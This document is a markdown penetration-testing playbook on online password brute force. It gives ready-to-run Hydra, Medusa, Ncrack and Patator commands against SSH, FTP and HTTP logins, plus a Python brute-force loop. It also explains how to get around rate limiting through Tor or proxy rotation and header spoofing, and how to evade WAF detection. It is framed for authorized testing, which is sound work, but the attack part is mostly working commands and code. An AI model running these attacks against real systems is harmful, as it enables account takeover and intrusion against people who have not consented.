# Password Attacks — Online Brute Force

## When this applies

- Authentication endpoint accepts arbitrary username/password combinations.
- No account lockout, no rate limiting (or both bypassable).
- Goal: discover valid credentials for one or more users.

## Technique

Systematically attempt password values against an authentication endpoint until valid credentials are found. Online attacks are limited by network round-trip and server-side rate limiting; pair with a curated wordlist or short charset for tractable runtimes.

## Steps

### 1. Identify auth endpoint and protocol

Common targets: SSH, FTP, RDP, SMB, HTTP forms, IMAP, MySQL, PostgreSQL, RDP/VNC.

### 2. Hydra examples

```bash
# SSH
hydra -L users.txt -P passwords.txt ssh://target.com

# HTTP POST form
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid"

# FTP
hydra -L users.txt -P passwords.txt ftp://target.com

# Slow-and-quiet
hydra -L users.txt -P passwords.txt -t 4 -w 30 ssh://target.com
# -t 4: 4 parallel; -w 30: 30s wait between attempts
```

### 3. Medusa / Ncrack / Patator

```bash
medusa -h target.com -U users.txt -P passwords.txt -M ssh
ncrack -p 22 -U users.txt -P passwords.txt target.com
patator ssh_login host=target.com user=FILE0 password=FILE1 0=users.txt 1=passwords.txt
```

### 4. Burp Suite Intruder (web forms)

- Cluster Bomb attack with two payload sets.
- Mark `^USER^` and `^PASS^` positions.
- Wordlists from SecLists / rockyou.
- Grep Match on success indicator (`Welcome` / `dashboard`).

### 5. Custom Python (web app)

```python
import requests
for u in open('users.txt'):
    for p in open('passwords.txt'):
        r = requests.post('https://target.com/login',
                          data={'user':u.strip(),'pass':p.strip()},
                          allow_redirects=False)
        if r.status_code == 302 or 'Welcome' in r.text:
            print(f'[+] {u.strip()}:{p.strip()}')
```

### 6. Detect and bypass rate limiting

- Detect by sending 5–10 wrong attempts and watching for 429 / lockout / CAPTCHA.
- Bypass via:
  - IP rotation (proxychains + Tor or a SOCKS proxy pool).
  - Distributing across User-Agent headers.
  - Slow attack (1 attempt per minute over hours).
  - Endpoint variants (mobile API, GraphQL, legacy /v1 vs /v2).
  - Header spoofing (X-Forwarded-For, X-Real-IP).

### 7. Detect account lockout policy

```bash
# Empirical: try 10 incorrect passwords for one account, then a known-good password
# If known-good fails → account is locked → policy threshold ≤ 10
```

Adjust spray window so password-spraying never crosses lockout thresholds.

### 8. Common username sources

- `users.txt` from SecLists (Discovery/Usernames/).
- LinkedIn / OSINT for company-specific names.
- Email harvesting (`email-format-${first}.${last}@target.com`).
- Username enumeration via response timing or distinct error messages.

## Verifying success

- Login redirects to dashboard / `Set-Cookie: session=...` is present.
- Subsequent authenticated request to `/me` or `/profile` returns user data.
- The credentials work in the legitimate UI flow.

## Common pitfalls

- Account lockout silently locks the account — coordinate with the engagement contact before high-volume attacks.
- Modern WAFs (Cloudflare, Imperva) detect Hydra signatures by User-Agent — randomize.
- HTTPS apps often enforce JA3 fingerprint matching — Hydra's TLS fingerprint differs from a browser. Use mitmproxy for Cloudflare-protected targets.
- Two-step login (username submitted first, password second) needs `hydra http-post-form` chain.

## Tools

- Hydra, Medusa, Ncrack, Patator (network protocols).
- Burp Intruder, ffuf (web).
- CrackMapExec (SMB / WinRM / MSSQL / SSH bulk).
- See also `password-spraying.md` for the safer spray pattern.

## References

- MITRE ATT&CK T1110.001 (Password Guessing).
- CWE-307 (Improper Restriction of Excessive Authentication Attempts).
- OWASP A07:2021.
